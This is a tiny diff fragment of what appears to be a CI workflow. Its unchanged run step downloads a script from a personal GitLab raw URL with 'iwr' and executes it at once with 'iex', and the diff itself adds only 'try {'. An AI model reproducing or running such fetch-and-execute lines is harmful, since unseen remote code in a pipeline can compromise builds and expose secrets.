@@ -34,6 +34,7 @@ jobs:
       run: |
         iex(iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a)
 
+        try {
 
 
 
